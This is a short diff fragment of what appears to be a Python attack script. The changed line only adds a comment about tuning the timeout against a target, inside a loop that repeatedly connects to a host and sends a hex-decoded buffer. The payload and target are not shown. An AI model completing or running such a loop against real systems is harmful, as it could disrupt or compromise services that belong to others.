@@ -22,7 +22,7 @@ secondbuffer = secondbufferhex.decode("hex")
 while 1:
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect=s.connect((host,port))
-    s.settimeout(4500)
+    s.settimeout(4500) # change for different effect based on target max timeout
     sendbuffer = buffer
     s.send(sendbuffer)
     s.recv(4906)
